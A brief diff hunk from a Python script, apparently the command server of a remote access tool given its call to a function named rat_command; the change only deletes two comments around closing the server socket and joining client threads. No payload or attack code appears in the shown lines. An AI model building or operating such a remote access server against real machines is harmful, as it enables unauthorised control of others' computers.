@@ -175,10 +175,10 @@ if __name__ == "__main__":
         response = rat_command(cmd)
         print(response)
     
-    # Close the server socket to stop accepting new connections
+    
     server_socket.close()
 
-    # Wait for all client threads to finish
+    
     for t in client_threads:
         t.join()
     
